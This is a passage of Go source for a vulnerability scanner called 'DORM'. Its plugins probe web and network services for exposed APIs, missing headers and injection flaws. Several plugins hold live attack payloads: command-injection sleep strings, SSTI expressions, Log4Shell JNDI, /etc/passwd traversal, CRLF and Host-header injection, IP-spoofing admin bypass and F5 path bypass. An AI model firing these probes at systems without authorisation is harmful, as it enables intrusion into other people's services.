		if isIgnition || (isSymfonyDump && isFacade) {
			return &Vulnerability{
				Target:      target,
				Name:        "Laravel Debug Mode Enabled (Stack Trace)",
				Severity:    "MEDIUM",
				CVSS:        5.3,
				Description: "Application reveals detailed stack traces and environment variables on error pages.",
				Solution:    "Set 'APP_DEBUG=false' in your production environment configuration.",
				Reference:   "OWASP Information Exposure",
			}
		}
	}

	return nil
}
// 25. DOCKER API EXPOSURE
type DockerAPIPlugin struct{}

func (p *DockerAPIPlugin) Name() string { return "Docker API Exposure" }
func (p *DockerAPIPlugin) Run(target ScanTarget) *Vulnerability {
	// Docker usually runs on 2375
	if target.Port != 2375 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/version"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if strings.Contains(string(body), "Platform") && strings.Contains(string(body), "GoVersion") {
		return &Vulnerability{Target: target, Name: "Docker API Publicly Exposed", Severity: "CRITICAL", CVSS: 10.0, Description: "Unauthorized Docker control possible.", Solution: "Close port to public.", Reference: ""}
	}
	return nil
}

// 26. COOKIE SECURITY FLAGS
type CookieSecPlugin struct{}

func (p *CookieSecPlugin) Name() string { return "Cookie Security" }
func (p *CookieSecPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	for _, cookie := range resp.Cookies() {
		if !cookie.HttpOnly || !cookie.Secure {
			return &Vulnerability{Target: target, Name: "Insecure Cookie", Severity: "LOW", CVSS: 3.0, Description: "HttpOnly or Secure flag missing.", Solution: "Harden cookie settings.", Reference: ""}
		}
	}
	return nil
}

// 27. SECURITY.TXT CHECK
type SecurityTxtPlugin struct{}

func (p *SecurityTxtPlugin) Name() string { return "Security.txt File" }
func (p *SecurityTxtPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.well-known/security.txt"))
	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		return &Vulnerability{Target: target, Name: "Security.txt Found", Severity: "INFO", CVSS: 0.0, Description: "Security contact info available.", Solution: "Informational.", Reference: ""}
	}
	return nil
}

// 28. WEBDAV CHECK
type WebDAVPlugin struct{}

func (p *WebDAVPlugin) Name() string { return "WebDAV Methods" }
func (p *WebDAVPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("OPTIONS", getURL(target, ""), nil)
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	allow := resp.Header.Get("Allow")
	if strings.Contains(allow, "PROPFIND") || strings.Contains(allow, "PUT") || strings.Contains(allow, "DELETE") {
		return &Vulnerability{Target: target, Name: "Dangerous HTTP Methods", Severity: "MEDIUM", CVSS: 6.5, Description: "WebDAV or PUT/DELETE methods enabled.", Solution: "Disable unnecessary HTTP methods.", Reference: ""}
	}
	return nil
}

// 29. EMAIL EXTRACTOR (Simple OSINT)
type EmailExtractPlugin struct{}

func (p *EmailExtractPlugin) Name() string { return "Email Disclosure" }
func (p *EmailExtractPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	content := string(body)

	if strings.Contains(content, "mailto:") {
		return &Vulnerability{Target: target, Name: "Email Address Found", Severity: "INFO", CVSS: 0.0, Description: "Email address found in source (Spam/Phishing risk).", Solution: "-", Reference: ""}
	}
	return nil
}

// 30. S3 BUCKET LEAK
type S3BucketPlugin struct{}

func (p *S3BucketPlugin) Name() string { return "S3 Bucket Detection" }
func (p *S3BucketPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	content := string(body)

	// Does source contain amazonaws link?
	if strings.Contains(content, ".s3.amazonaws.com") {
		return &Vulnerability{Target: target, Name: "S3 Bucket Link", Severity: "LOW", CVSS: 4.0, Description: "Amazon S3 link detected. Check permissions.", Solution: "Disable public access to bucket.", Reference: ""}
	}
	return nil
}

// ==========================================
// NEW ADDITION: DORM v6 MODERN PLUGINS (31-40)
// ==========================================

// 31. CLICKJACKING (X-Frame-Options)
type ClickjackingPlugin struct{}

func (p *ClickjackingPlugin) Name() string { return "Clickjacking Check" }
func (p *ClickjackingPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// FIX: getClient() is called without parameters
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.Header.Get("X-Frame-Options") == "" && resp.Header.Get("Content-Security-Policy") == "" {
		return &Vulnerability{
			Target: target, Name: "Clickjacking Risk", Severity: "LOW", CVSS: 3.0,
			Description: "X-Frame-Options header is missing.",
			Solution:    "Add DENY or SAMEORIGIN directives.",
			Reference:   "OWASP Clickjacking",
		}
	}
	return nil
}

// 32. GRAPHQL INTROSPECTION
type GraphQLPlugin struct{}

func (p *GraphQLPlugin) Name() string { return "GraphQL Schema Disclosure" }
func (p *GraphQLPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	payload := `{"query": "{__schema{types{name}}}"}`
	resp, err := getClient().Post(getURL(target, "/graphql"), "application/json", strings.NewReader(payload))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "__schema") {
			return &Vulnerability{
				Target: target, Name: "GraphQL Introspection Enabled", Severity: "MEDIUM", CVSS: 5.0,
				Description: "API schema is publicly exposed.",
				Solution:    "Disable introspection in production.",
				Reference:   "GraphQL Security",
			}
		}
	}
	return nil
}

// 33. SWAGGER UI FINDER
type SwaggerPlugin struct{}

func (p *SwaggerPlugin) Name() string { return "Swagger UI Detection" }
func (p *SwaggerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	paths := []string{"/swagger-ui.html", "/api/docs", "/v2/api-docs", "/docs"}
	for _, path := range paths {
		resp, err := getClient().Get(getURL(target, path))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			return &Vulnerability{
				Target: target, Name: "API Documentation (Swagger)", Severity: "LOW", CVSS: 4.0,
				Description: "API endpoints are exposed: " + path,
				Solution:    "Restrict public access.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 34. HOST HEADER INJECTION
type HostHeaderPlugin struct{}

func (p *HostHeaderPlugin) Name() string { return "Host Header Injection" }
func (p *HostHeaderPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
	req.Host = "evil.com"
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	buf := make([]byte, 1024)
	resp.Body.Read(buf)
	if strings.Contains(string(buf), "evil.com") || resp.Header.Get("Location") == "evil.com" {
		return &Vulnerability{
			Target: target, Name: "Host Header Injection", Severity: "MEDIUM", CVSS: 5.4,
			Description: "Host header can be manipulated.",
			Solution:    "Validate the Host header.",
			Reference:   "",
		}
	}
	return nil
}

// 35. PROMETHEUS METRICS
type PrometheusPlugin struct{}

func (p *PrometheusPlugin) Name() string { return "Prometheus Metrics Exposure" }
func (p *PrometheusPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/metrics"))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		buf := make([]byte, 500)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "go_goroutines") || strings.Contains(string(buf), "process_cpu_seconds") {
			return &Vulnerability{
				Target: target, Name: "System Metrics Exposure", Severity: "MEDIUM", CVSS: 5.0,
				Description: "/metrics endpoint is open.",
				Solution:    "Restrict access.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 36. SSTI (Server Side Template Injection) - v2
type SSTIPlugin struct{}

func (p *SSTIPlugin) Name() string { return "SSTI Test (Advanced & Verified)" }

func (p *SSTIPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	// Unique mathematical operation to minimize false positives.
	// Operation: 1337 * 1337 = 1787569
	const num1, num2 = 1337, 1337
	const expectedResult = "1787569"

	// List of common template engine syntaxes
	payloads := []struct {
		Engine  string
		Pattern string
	}{
		{"Jinja2/Twig (Python/PHP)", "{{%d*%d}}"},
		{"Smarty/Mako (PHP/Python)", "${%d*%d}"},
		{"FreeMarker/Velocity (Java)", "#{%d*%d}"},
		{"ERB (Ruby)", "<%%= %d*%d %%>"},
	}

	for _, entry := range payloads {
		payloadStr := fmt.Sprintf(entry.Pattern, num1, num2)
		encodedPayload := url.QueryEscape(payloadStr)
		targetURL := getURL(target, "/?q="+encodedPayload)

		resp, err := client.Get(targetURL)
		if err == nil {
			defer resp.Body.Close()

			// Read response body (limited to 4KB for performance)
			buf := make([]byte, 4096)
			n, _ := resp.Body.Read(buf)
			body := string(buf[:n])

			// Verification Logic:
			// 1. Check if the mathematical result exists in the response.
			// 2. Ensure the raw payload is NOT reflected (avoids false positives from simple reflection).
			hasResult := strings.Contains(body, expectedResult)
			hasRawPayload := strings.Contains(body, payloadStr)

			if hasResult && !hasRawPayload {
				return &Vulnerability{
					Target:      target,
					Name:        fmt.Sprintf("Template Injection (SSTI) - %s", entry.Engine),
					Severity:    "CRITICAL",
					CVSS:        9.9,
					Description: fmt.Sprintf("Template engine successfully executed code.\nPayload: %s\nResult: %s", payloadStr, expectedResult),
					Solution:    "Sanitize user inputs and enforce strict context isolation in templates.",
					Reference:   "OWASP SSTI",
				}
			}
		}
	}
	return nil
}
// 37. HSTS CHECK
type HSTSPlugin struct{}

func (p *HSTSPlugin) Name() string { return "HSTS (HTTPS Enforcement)" }
func (p *HSTSPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 443 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.Header.Get("Strict-Transport-Security") == "" {
		return &Vulnerability{Target: target, Name: "HSTS Missing", Severity: "LOW", CVSS: 2.0, Description: "Strict-Transport-Security header is missing.", Solution: "Enable HSTS.", Reference: ""}
	}
	return nil
}

// 38. TOMCAT MANAGER
type TomcatManagerPlugin struct{}

func (p *TomcatManagerPlugin) Name() string { return "Tomcat Manager Panel" }
func (p *TomcatManagerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/manager/html"))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 401 || resp.StatusCode == 200 {
			return &Vulnerability{Target: target, Name: "Tomcat Manager Panel", Severity: "HIGH", CVSS: 7.0, Description: "Tomcat Manager panel is accessible.", Solution: "Block external access.", Reference: ""}
		}
	}
	return nil
}

// 39. SENSITIVE CONFIGS
type SensitiveConfigPlugin struct{}

func (p *SensitiveConfigPlugin) Name() string { return "Editor/Config File Disclosure" }
func (p *SensitiveConfigPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	files := []string{"/.vscode/sftp.json", "/.idea/workspace.xml", "/.git/config"}
	for _, f := range files {
		resp, err := getClient().Get(getURL(target, f))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			return &Vulnerability{Target: target, Name: "Sensitive Config File", Severity: "MEDIUM", CVSS: 5.0, Description: "File found: " + f, Solution: "Block access.", Reference: ""}
		}
	}
	return nil
}

// 40. PYTHON SERVER CHECK
type PythonServerPlugin struct{}

func (p *PythonServerPlugin) Name() string { return "Open Directory Listing" }
func (p *PythonServerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/"))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "Directory listing for") {
			return &Vulnerability{
				Target: target, Name: "Directory Listing Enabled", Severity: "MEDIUM", CVSS: 5.0,
				Description: "Folder contents are visible to everyone.",
				Solution:    "Disable indexing.",
				Reference:   "",
			}
		}
	}
	return nil
}

// ==========================================
// DORM v7: HARDENED / PRO WEAPONS (41-50)
// ==========================================

// 41. BLIND RCE (Time Based & Verified) - v2
type BlindRCEPlugin struct{}

func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Time-Based & Verified)" }

func (p *BlindRCEPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	// 1. BASELINE CHECK
	startBase := time.Now()
	respBase, err := client.Get(getURL(target, "/?cmd=test_normal"))
	if err != nil {
		return nil
	}
	respBase.Body.Close()
	baseDuration := time.Since(startBase)

	// If server is naturally too slow (>4s), skip time-based checks to avoid false positives.
	if baseDuration > 4*time.Second {
		return nil
	}

	sleepSeconds := 5
	targetSleepDuration := time.Duration(sleepSeconds) * time.Second

	payloads := []string{
		fmt.Sprintf("$(sleep %d)", sleepSeconds),  // Linux subshell
		fmt.Sprintf("|sleep %d", sleepSeconds),    // Linux pipe
		fmt.Sprintf("%%26sleep+%d", sleepSeconds), // Linux & (URL Encoded)
		fmt.Sprintf(";sleep %d", sleepSeconds),    // Linux sequence
	}

	for _, payload := range payloads {
		startAttack := time.Now()

		respAttack, err := client.Get(getURL(target, "/?cmd="+payload))

		if err == nil {
			respAttack.Body.Close()
			attackDuration := time.Since(startAttack)

			// Logic: Attack Time > (Baseline + Sleep - Tolerance)
			threshold := baseDuration + targetSleepDuration - (1 * time.Second)

			if attackDuration > threshold {
				return &Vulnerability{
					Target:      target,
					Name:        "Blind OS Command Injection (High Confidence)",
					Severity:    "CRITICAL",
					CVSS:        9.8,
					Description: fmt.Sprintf("Server confirmed execution of 'sleep %d' payload.\nBaseline Latency: %v\nAttack Latency: %v", sleepSeconds, baseDuration, attackDuration),
					Solution:    "Strictly validate user inputs and disable system command execution functions.",
					Reference:   "OWASP Command Injection",
				}
			}
		}
	}
	return nil
}
// 42. XXE INJECTION (XML External Entity)
type XXEPlugin struct{}

func (p *XXEPlugin) Name() string { return "XXE Injection" }
func (p *XXEPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Sending a simple XML payload
	payload := `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe "DORM_XXE_TEST">]><foo>&xxe;</foo>`
	resp, err := getClient().Post(getURL(target, "/xml"), "application/xml", strings.NewReader(payload))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		// If server parses entity and returns "DORM_XXE_TEST", it's vulnerable.
		if strings.Contains(string(buf), "DORM_XXE_TEST") {
			return &Vulnerability{
				Target: target, Name: "XML External Entity (XXE)", Severity: "HIGH", CVSS: 8.2,
				Description: "XML parsing can be manipulated.",
				Solution:    "Disable external entities in XML parser.",
				Reference:   "OWASP XXE",
			}
		}
	}
	return nil
}

// 43. ADMIN IP BYPASS (Header Spoofing & Verified) - v2
type AdminBypassPlugin struct{}

func (p *AdminBypassPlugin) Name() string { return "Admin Panel Bypass (IP Spoof - Verified)" }

func (p *AdminBypassPlugin) Run(target ScanTarget) *Vulnerability {
    if !isWebPort(target.Port) {
        return nil
    }

    client := getClient()
    targetPath := "/admin" // Can be adjusted to /console, /dashboard etc.
    fullURL := getURL(target, targetPath)

    // 1. BASELINE CHECK
    reqBase, _ := http.NewRequest("GET", fullURL, nil)
    respBase, err := client.Do(reqBase)
    if err != nil {
        return nil
    }
    baseStatus := respBase.StatusCode
    respBase.Body.Close()

    // If already accessible (200) or not found (404), skip bypass attempt.
    // We only target Forbidden (403) or Unauthorized (401) pages.
    if baseStatus != 403 && baseStatus != 401 {
        return nil
    }

    headers := []string{
        "X-Forwarded-For",
        "X-Real-IP",
        "Client-IP",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "X-Host",
        "X-Forwarded-Host",
    }

    spoofIPs := []string{
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "192.168.1.1",
        "10.0.0.1",
        "::1", // IPv6 Localhost
    }

    for _, header := range headers {
        for _, ip := range spoofIPs {
            reqSpoof, _ := http.NewRequest("GET", fullURL, nil)
            reqSpoof.Header.Set(header, ip)

            respSpoof, err := client.Do(reqSpoof)
            if err == nil {
                spoofStatus := respSpoof.StatusCode
                respSpoof.Body.Close()

                // CRITICAL: If status changes from Forbidden (403) to OK (200)
                if spoofStatus == 200 {
                    return &Vulnerability{
                        Target:   target,
                        Name:     "Admin IP Restriction Bypass",
                        Severity: "CRITICAL",
                        CVSS:     9.8,
                        Description: fmt.Sprintf(
                            "Access restriction bypassed!\nBaseline Status: %d\nBypass Status: %d\nEffective Header: %s: %s",
                            baseStatus, spoofStatus, header, ip),
                        Solution:  "Do not rely solely on client-side headers (e.g., X-Forwarded-For) for access control/authentication.",
                        Reference: "CWE-290: Authentication Bypass by Spoofing",
                    }
                }
            }
        }
    }

    return nil
}

// 44. CRLF INJECTION (HTTP Response Splitting)
type CRLFPlugin struct{}

func (p *CRLFPlugin) Name() string { return "CRLF Injection" }
func (p *CRLFPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Try adding a fake cookie via line break characters (%0d%0a)
	payload := "/%0d%0aSet-Cookie:DORM=Hacked"
	resp, err := getClient().Get(getURL(target, payload))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// If server accepts our fake cookie and writes it to Header
	if strings.Contains(resp.Header.Get("Set-Cookie"), "DORM=Hacked") {
		return &Vulnerability{
			Target: target, Name: "CRLF Injection / Response Splitting", Severity: "MEDIUM", CVSS: 6.5,
			Description: "HTTP response can be split.",
			Solution:    "Encode URL inputs.",
			Reference:   "",
		}
	}
	return nil
}

// 45. DANGEROUS HTTP METHODS
type DangerousMethodsPlugin struct{}

func (p *DangerousMethodsPlugin) Name() string { return "Dangerous HTTP Methods" }
func (p *DangerousMethodsPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Try to upload a file to server via PUT (Fake request)
	req, _ := http.NewRequest("PUT", getURL(target, "/dorm_test.txt"), strings.NewReader("test"))
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode == 201 || resp.StatusCode == 200 {
		return &Vulnerability{
			Target: target, Name: "PUT Method Enabled", Severity: "HIGH", CVSS: 7.5,
			Description: "File upload via PUT is possible.",
			Solution:    "Disable unnecessary HTTP methods.",
			Reference:   "",
		}
	}
	return nil
}

// 46. JAVA DESERIALIZATION (Header Check)
type JavaDeserializationPlugin struct{}

func (p *JavaDeserializationPlugin) Name() string { return "Java Deserialization Risk" }
func (p *JavaDeserializationPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Usually found in JBoss, Jenkins etc.
	// We look for rO0AB (Base64 Java Object Magic Bytes) in Cookies or Headers.
	// This is a simple detection, not an active attack.
	resp, err := getClient().Get(getURL(target, "/"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	for _, cookie := range resp.Cookies() {
		// Java serialized objects start with "rO0AB" (Base64)
		if strings.HasPrefix(cookie.Value, "rO0AB") {
			return &Vulnerability{
				Target: target, Name: "Java Serialized Object", Severity: "HIGH", CVSS: 8.1,
				Description: "Java object detected in Cookie. RCE risk.",
				Solution:    "Do not use insecure deserialization.",
				Reference:   "OWASP Deserialization",
			}
		}
	}
	return nil
}

// 47. NODE.JS PROTOTYPE POLLUTION
type PrototypePollutionPlugin struct{}

func (p *PrototypePollutionPlugin) Name() string { return "Node.js Prototype Pollution" }
func (p *PrototypePollutionPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Try to pollute Object Prototype via JSON payload
	payload := `{"__proto__": {"dorm_polluted": true}}`
	req, _ := http.NewRequest("POST", getURL(target, "/"), strings.NewReader(payload))
	req.Header.Set("Content-Type", "application/json")
	resp, err := getClient().Do(req)

	if err == nil {
		defer resp.Body.Close()
		// Check effect in second request (Basic check, detailed analysis requires more)
		// This detects "suspicious behavior".
		if resp.StatusCode == 500 { // Suspect if crash or error occurs
			return &Vulnerability{
				Target: target, Name: "Prototype Pollution Suspected", Severity: "MEDIUM", CVSS: 6.0,
				Description: "JSON payload caused server error.",
				Solution:    "Validate input types.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 48. DIRECTORY TRAVERSAL (DotDotPwn)
type TraversalPlugin struct{}

func (p *TraversalPlugin) Name() string { return "Directory Traversal" }
func (p *TraversalPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Try to reach /etc/passwd
	payloads := []string{"/../../../../etc/passwd", "/..%2f..%2f..%2f..%2fetc%2fpasswd", "/windows/win.ini"}

	for _, pay := range payloads {
		resp, err := getClient().Get(getURL(target, pay))
		if err == nil {
			defer resp.Body.Close()
			buf := make([]byte, 2048)
			resp.Body.Read(buf)
			content := string(buf)
			if strings.Contains(content, "root:x:0:0") || strings.Contains(content, "[fonts]") {
				return &Vulnerability{
					Target: target, Name: "Directory Traversal", Severity: "CRITICAL", CVSS: 9.3,
					Description: "System files are readable.",
					Solution:    "Sanitize file path inputs.",
					Reference:   "OWASP Path Traversal",
				}
			}
		}
	}
	return nil
}

// 49. CONFIG.JSON EXPOSURE
type ConfigJsonPlugin struct{}

func (p *ConfigJsonPlugin) Name() string { return "Config.json Disclosure" }
func (p *ConfigJsonPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Modern web app config files
	files := []string{"/config.json", "/app_config.json", "/settings.js"}
	for _, f := range files {
		resp, err := getClient().Get(getURL(target, f))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			buf := make([]byte, 500)
			resp.Body.Read(buf)
			if strings.Contains(string(buf), "api_key") || strings.Contains(string(buf), "secret") || strings.Contains(string(buf), "db_host") {
				return &Vulnerability{
					Target: target, Name: "Config File Disclosure", Severity: "HIGH", CVSS: 7.5,
					Description: "Configuration file contains sensitive data.",
					Solution:    "Block access.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 50. IDOR / BROKEN ACCESS (Basic Check)
type IDORPlugin struct{}

func (p *IDORPlugin) Name() string { return "IDOR / Unauthorized Access Test" }
func (p *IDORPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Common IDOR parameters
	urls := []string{"/profile?id=1", "/user/1", "/order/1"}
	for _, u := range urls {
		resp, err := getClient().Get(getURL(target, u))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			buf := make([]byte, 500)
			resp.Body.Read(buf)
			if strings.Contains(string(buf), "admin") || strings.Contains(string(buf), "email") {
				return &Vulnerability{
					Target: target, Name: "Potential IDOR / Auth Bypass", Severity: "MEDIUM", CVSS: 6.5,
					Description: "Sensitive ID access without login.",
					Solution:    "Implement proper authorization checks.",
					Reference:   "OWASP IDOR",
				}
			}
		}
	}
	return nil
}

// ==========================================
// DORM v8: ELITE / ENTERPRISE PACK (51-70)
// ==========================================

// 51. LOG4SHELL (JNDI Injection - Header)
type Log4jPlugin struct{}

func (p *Log4jPlugin) Name() string { return "Log4Shell (CVE-2021-44228)" }
func (p *Log4jPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
	payload := "${jndi:ldap://dorm-scanner-test/a}"
	req.Header.Set("User-Agent", payload)
	req.Header.Set("X-Api-Version", payload)

	resp, err := getClient().Do(req)
	if err == nil {
		defer resp.Body.Close()
		// If server crashes (500) or behaves oddly, it's suspicious.
		// (Note: Requires DNS callback for full confirmation, this is "passive" detection)
		if resp.StatusCode == 500 {
			return &Vulnerability{
				Target: target, Name: "Log4Shell Suspected", Severity: "CRITICAL", CVSS: 10.0,
				Description: "Log4j payload caused server error.",
				Solution:    "Update Log4j library immediately.",
				Reference:   "CVE-2021-44228",
			}
		}
	}
	return nil
}

// 52. KUBERNETES KUBELET API (Unauth Access)
type KubeletPlugin struct{}

func (p *KubeletPlugin) Name() string { return "Kubernetes Kubelet API" }
func (p *KubeletPlugin) Run(target ScanTarget) *Vulnerability {
	// Kubelet usually runs on 10250
	if target.Port != 10250 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/pods"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		// If PodList returns, it's a disaster
		if strings.Contains(string(buf), "\"kind\":\"PodList\"") {
			return &Vulnerability{
				Target: target, Name: "Kubelet API Exposure", Severity: "CRITICAL", CVSS: 10.0,
				Description: "Kubernetes pod list accessible without auth.",
				Solution:    "Disable Anonymous auth.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 53. DOCKER REGISTRY CATALOG
type DockerRegistryPlugin struct{}

func (p *DockerRegistryPlugin) Name() string { return "Docker Registry Exposure" }
func (p *DockerRegistryPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/v2/_catalog"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "repositories") {
			return &Vulnerability{
				Target: target, Name: "Open Docker Registry", Severity: "HIGH", CVSS: 7.5,
				Description: "Docker image list is public.",
				Solution:    "Enable Authentication.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 54. SPRING CLOUD GATEWAY RCE
type SpringCloudPlugin struct{}

func (p *SpringCloudPlugin) Name() string { return "Spring Cloud Gateway RCE" }
func (p *SpringCloudPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/actuator/gateway/routes"))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		return &Vulnerability{
			Target: target, Name: "Spring Gateway Actuator", Severity: "HIGH", CVSS: 9.0,
			Description: "Actuator route endpoint exposed, RCE possible.",
			Solution:    "Close the endpoint.",
			Reference:   "CVE-2022-22947",
		}
	}
	return nil
}

// 55. F5 BIG-IP TMUI RCE (Auth Bypass)
type F5BigIPPlugin struct{}

func (p *F5BigIPPlugin) Name() string { return "F5 BIG-IP TMUI RCE" }
func (p *F5BigIPPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Auth bypass attempt via URL manipulation
	url := getURL(target, "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp")
	resp, err := getClient().Get(url)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			return &Vulnerability{
				Target: target, Name: "F5 BIG-IP Auth Bypass", Severity: "CRITICAL", CVSS: 9.8,
				Description: "Unauthorized access to TMUI interface.",
				Solution:    "Patch F5 device.",
				Reference:   "CVE-2020-5902",
			}
		}
	}
	return nil
}

// 56. JENKINS SCRIPT CONSOLE
type JenkinsPlugin struct{}

func (p *JenkinsPlugin) Name() string { return "Jenkins Script Console" }
func (p *JenkinsPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/script"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "println") || strings.Contains(string(buf), "Groovy") {
			return &Vulnerability{
				Target: target, Name: "Jenkins Script Console Open", Severity: "CRITICAL", CVSS: 9.8,
				Description: "Unauthenticated RCE panel found.",
				Solution:    "Secure Jenkins with password.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 57. REDIS UNAUTH (TCP)
type RedisPlugin struct{}

func (p *RedisPlugin) Name() string { return "Redis Unauthorized Access" }
func (p *RedisPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 6379 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Send PING command
	conn.Write([]byte("PING\r\n"))
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "PONG") {
		return &Vulnerability{
			Target: target, Name: "Unprotected Redis Server", Severity: "CRITICAL", CVSS: 9.0,
			Description: "Redis server has no password, DB can be stolen.",
			Solution:    "Use 'requirepass' directive.",
			Reference:   "",
		}
	}
	return nil
}

// 58. MONGODB NO-AUTH (TCP)
type MongoPlugin struct{}

func (p *MongoPlugin) Name() string { return "MongoDB Unauthorized Access" }
func (p *MongoPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 27017 {
		return nil
	}
	// Hard to simulate full Mongo wire protocol, basic connection test
	// If connection is established, there is risk.
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	return &Vulnerability{
		Target: target, Name: "Open MongoDB Port", Severity: "MEDIUM", CVSS: 5.0,
